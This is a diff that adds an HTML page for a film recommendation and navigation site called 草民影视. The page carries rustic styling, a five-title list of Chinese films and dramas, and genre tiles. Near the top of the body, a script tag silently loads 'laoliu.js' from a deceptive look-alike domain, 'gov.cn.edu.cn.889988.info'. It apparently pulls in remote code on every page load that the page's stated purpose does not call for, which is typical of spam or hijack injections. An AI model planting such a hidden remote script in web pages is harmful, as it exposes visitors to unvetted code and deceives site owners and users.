@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>草民影视 - 民间影视导航与片单整理 | caominyingshi-h5.github.io</title>
+<meta name="description" content="草民影视(caominyingshi-h5.github.io)专注民间影视导航，市井好片、江湖老片、烟火剧集分类整理，粗茶淡饭间品赏光影百态。" />
+<meta name="keywords" content="草民影视,caominyingshi-h5,民间影视,市井片单,江湖老片,烟火剧集" />
+<style>
+:root{
+  --hemp:#e8dcc8;
+  --hemp-2:#d9c9a8;
+  --hemp-3:#c4b08e;
+  --ink:#2a1f18;
+  --ink-2:#4a3a2c;
+  --ink-3:#7a6850;
+  --red:#b33939;
+  --red-2:#8b2525;
+  --bamboo:#5a7a4a;
+  --bamboo-2:#3d5a30;
+  --line:rgba(42,31,24,0.15);
+  --shadow:0 4px 16px rgba(42,31,24,0.12);
+  --shadow-hover:0 8px 28px rgba(42,31,24,0.2);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Songti SC","SimSun",serif;
+  background:
+    repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.02) 2px,rgba(0,0,0,0.02) 4px),
+    var(--hemp);
+  color:var(--ink);
+  line-height:1.85;
+  overflow-x:hidden;
+}
+a{color:var(--red);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 粗布纹理叠加 */
+body::before{
+  content:"";position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;
+  background-image:
+    repeating-linear-gradient(90deg,transparent,transparent 3px,rgba(139,37,37,0.03) 3px,rgba(139,37,37,0.03) 6px),
+    repeating-linear-gradient(0deg,transparent,transparent 5px,rgba(0,0,0,0.02) 5px,rgba(0,0,0,0.02) 10px);
+}
+
+/* 顶部木刻印章 */
+.seal-head{
+  position:relative;z-index:10;text-align:center;padding:50px 20px 36px;
+}
+.seal-mark{
+  width:84px;height:84px;margin:0 auto 16px;
+  background:var(--red);color:#f0e6d6;
+  display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:900;
+  border-radius:12px;
+  box-shadow:inset 0 0 0 3px rgba(255,255,255,0.2),var(--shadow);
+  transform:rotate(-3deg);
+  letter-spacing:2px;
+}
+.seal-head h1{
+  font-size:34px;font-weight:900;color:var(--ink);
+  margin-bottom:6px;letter-spacing:4px;
+}
+.seal-head h1 b{color:var(--red)}
+.seal-head p{
+  max-width:500px;margin:0 auto;color:var(--ink-2);font-size:15px;
+  font-style:italic;
+}
+.seal-nav{
+  margin-top:22px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;
+}
+.seal-nav a{
+  padding:9px 20px;border:1.5px solid var(--ink);border-radius:4px;
+  font-size:14px;font-weight:700;color:var(--ink);
+  background:rgba(232,220,200,0.8);transition:.25s;
+}
+.seal-nav a:hover{background:var(--ink);color:var(--hemp)}
+
+/* 主容器 */
+.wrap{
+  position:relative;z-index:10;max-width:900px;margin:0 auto;padding:0 18px 60px;
+}
+
+/* 区块标题 */
+.section{margin-bottom:52px;scroll-margin-top:20px}
+.sec-title{
+  display:flex;align-items:center;gap:12px;margin-bottom:26px;
+}
+.sec-title .stamp{
+  width:36px;height:36px;background:var(--red);color:#f0e6d6;
+  display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;
+  border-radius:6px;transform:rotate(-5deg);flex-shrink:0;
+}
+.sec-title h2{font-size:22px;font-weight:900;letter-spacing:2px}
+.sec-title .brush{flex:1;height:2px;background:linear-gradient(90deg,var(--ink),transparent)}
+
+/* 叙事流卡片 */
+.tale-list{display:flex;flex-direction:column;gap:0}
+.tale-row{
+  display:grid;grid-template-columns:80px 1fr auto;gap:18px;align-items:center;
+  padding:22px 0;border-bottom:1px dashed var(--line);transition:.25s;
+}
+.tale-row:nth-child(even){grid-template-columns:1fr 80px auto;direction:rtl}
+.tale-row:nth-child(even)>*{direction:ltr}
+.tale-row:hover{background:rgba(255,255,255,0.3);padding-left:12px;padding-right:12px;border-radius:8px}
+.tale-num{
+  font-size:28px;font-weight:900;color:var(--red);opacity:0.3;
+  font-family:"Courier New",monospace;text-align:center;
+}
+.tale-row:nth-child(even) .tale-num{color:var(--bamboo)}
+.tale-body h3{font-size:18px;font-weight:800;margin-bottom:4px;letter-spacing:1px}
+.tale-body p{font-size:14px;color:var(--ink-2);line-height:1.7}
+.tale-tag{
+  font-size:12px;padding:5px 12px;border-radius:3px;font-weight:700;white-space:nowrap;
+  border:1px solid var(--line);background:rgba(255,255,255,0.5);color:var(--ink-2);
+}
+.tale-row:nth-child(1) .tale-tag{color:var(--red);border-color:var(--red);background:rgba(179,57,57,0.08)}
+.tale-row:nth-child(2) .tale-tag{color:var(--bamboo);border-color:var(--bamboo);background:rgba(90,122,74,0.08)}
+.tale-row:nth-child(3) .tale-tag{color:#8b6f47;border-color:#8b6f47;background:rgba(139,111,71,0.08)}
+.tale-row:nth-child(4) .tale-tag{color:#5a4a7a;border-color:#5a4a7a;background:rgba(90,74,122,0.08)}
+.tale-row:nth-child(5) .tale-tag{color:var(--red-2);border-color:var(--red-2);background:rgba(139,37,37,0.08)}
+
+/* 竹简分类 */
+.bamboo-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;
+}
+.bamboo-slip{
+  background:linear-gradient(180deg,var(--hemp-2),var(--hemp-3));
+  border:1px solid var(--ink);border-radius:4px;padding:20px 14px;text-align:center;
+  position:relative;transition:.25s;cursor:pointer;
+}
+.bamboo-slip::before,.bamboo-slip::after{
+  content:"";position:absolute;left:50%;width:8px;height:8px;background:var(--ink);
+  border-radius:50%;transform:translateX(-50%);
+}
+.bamboo-slip::before{top:-4px}
+.bamboo-slip::after{bottom:-4px}
+.bamboo-slip:hover{transform:translateY(-4px);background:var(--bamboo);color:#f0e6d6;border-color:var(--bamboo-2)}
+.bamboo-slip:hover h4,.bamboo-slip:hover p{color:#f0e6d6}
+.bamboo-slip .ico{font-size:26px;margin-bottom:8px}
+.bamboo-slip h4{font-size:16px;font-weight:800;margin-bottom:2px;color:var(--ink);transition:.25s}
+.bamboo-slip p{font-size:12px;color:var(--ink-2);transition:.25s}
+
+/* 关于 */
+.about-block{
+  background:rgba(255,255,255,0.4);border:1.5px solid var(--ink);border-left:6px solid var(--red);
+  border-radius:6px;padding:24px;font-size:15px;color:var(--ink-2);line-height:1.9;
+}
+.about-block b{color:var(--red)}
+
+/* 烟火状态栏 */
+.fire-bar{
+  position:relative;z-index:10;background:var(--ink);color:var(--hemp-2);
+  padding:12px 20px;text-align:center;font-size:13px;
+  display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap;
+}
+.fire-bar .fire-item{display:flex;align-items:center;gap:6px}
+.fire-bar .ember{animation:flicker 1.5s ease-in-out infinite}
+@keyframes flicker{
+  0%,100%{opacity:1}
+  50%{opacity:0.5}
+}
+
+/* 页脚 */
+.footer{
+  position:relative;z-index:10;text-align:center;padding:22px 16px;
+  color:var(--ink-3);font-size:12px;border-top:1px solid var(--line);
+  background:rgba(232,220,200,0.8);
+}
+
+/* 移动端 */
+@media(max-width:640px){
+  .seal-head h1{font-size:24px}
+  .seal-mark{width:64px;height:64px;font-size:24px}
+  .tale-row,.tale-row:nth-child(even){
+    grid-template-columns:60px 1fr;direction:ltr;gap:12px;
+  }
+  .tale-row .tale-tag{grid-column:1/3;justify-self:start;margin-top:4px}
+  .tale-num{font-size:22px}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .bamboo-grid{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="seal-head">
+  <div class="seal-mark">草民</div>
+  <h1><b>草民</b>影视</h1>
+  <p>caominyingshi-h5.github.io —— 粗茶淡饭，光影百态。市井好片、江湖老片，草民自有草民的品法。</p>
+  <nav class="seal-nav">
+    <a href="#">首页</a>
+    <a href="#list">市井片单</a>
+    <a href="#cat">江湖分类</a>
+    <a href="#about">关于草民</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section class="section" id="list">
+    <div class="sec-title">
+      <span class="stamp">壹</span><h2>市井片单</h2><span class="brush"></span>
+    </div>
+    <div class="tale-list">
+      <article class="tale-row">
+        <div class="tale-num">01</div>
+        <div class="tale-body">
+          <h3>活着</h3>
+          <p>1994 · 张艺谋执导 · 葛优/巩俐主演 —— 福贵一生，时代洪流中的小人物悲欢，草民之泪。</p>
+        </div>
+        <span class="tale-tag">必看经典</span>
+      </article>
+      <article class="tale-row">
+        <div class="tale-num">02</div>
+        <div class="tale-body">
+          <h3>山海情</h3>
+          <p>2021 · 孔笙/孙墨龙执导 —— 西海固移民脱贫史诗，黄沙变绿洲，草民改命的真实写照。</p>
+        </div>
+        <span class="tale-tag">口碑热剧</span>
+      </article>
+      <article class="tale-row">
+        <div class="tale-num">03</div>
+        <div class="tale-body">
+          <h3>隐入尘烟</h3>
+          <p>2022 · 李睿珺执导 —— 西北农村两个被遗忘的人，泥土里长出最后一点温情，终归尘烟。</p>
+        </div>
+        <span class="tale-tag">独立佳作</span>
+      </article>
+      <article class="tale-row">
+        <div class="tale-num">04</div>
+        <div class="tale-body">
+          <h3>我不是药神</h3>
+          <p>2018 · 文牧野执导 —— 卖药小贩程勇，从贪财到舍命，草民良心在金钱与生命间挣扎。</p>
+        </div>
+        <span class="tale-tag">社会现实</span>
+      </article>
+      <article class="tale-row">
+        <div class="tale-num">05</div>
+        <div class="tale-body">
+          <h3>大江大河</h3>
+          <p>2018 · 孔笙/黄伟执导 —— 改革开放四十年，三个草民子弟的命运分野，时代浪潮中的浮沉录。</p>
+        </div>
+        <span class="tale-tag">年代史诗</span>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="cat">
+    <div class="sec-title">
+      <span class="stamp">贰</span><h2>江湖分类</h2><span class="brush"></span>
+    </div>
+    <div class="bamboo-grid">
+      <div class="bamboo-slip"><div class="ico">🏚️</div><h4>市井百态</h4><p>平民/家庭/生活</p></div>
+      <div class="bamboo-slip"><div class="ico">⚔️</div><h4>江湖武侠</h4><p>武侠/动作/古装</p></div>
+      <div class="bamboo-slip"><div class="ico">🏭</div><h4>时代浮沉</h4><p>年代/历史/传记</p></div>
+      <div class="bamboo-slip"><div class="ico">🌾</div><h4>乡土田园</h4><p>农村/自然/慢生活</p></div>
+      <div class="bamboo-slip"><div class="ico">🎪</div><h4>市井喜剧</h4><p>喜剧/荒诞/黑色幽默</p></div>
+      <div class="bamboo-slip"><div class="ico">📜</div><h4>民间纪录</h4><p>纪录片/真实影像</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title">
+      <span class="stamp">叁</span><h2>关于草民</h2><span class="brush"></span>
+    </div>
+    <div class="about-block">
+      <p>
+        <b>草民影视</b>（caominyingshi-h5.github.io）是一个民间影视导航与片单整理站点。
+        不做播放器、不提供盗版源，只帮普通观众把<b>好片、老片、被遗忘的片</b>按市井烟火的方式排出来。
+        粗茶淡饭间，品赏光影百态。页面移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，所有内容仅供学习与交流使用。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="fire-bar">
+  <div class="fire-item"><span class="ember">🔥</span><span>烟火不断</span></div>
+  <div class="fire-item"><span>📜</span><span>草民片单持续更新</span></div>
+  <div class="fire-item"><span>🏮</span><span>服务状态：正常</span></div>
+</div>
+
+<footer class="footer">
+  © 2026 草民影视 | caominyingshi-h5.github.io | 粗茶淡饭，光影百态 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
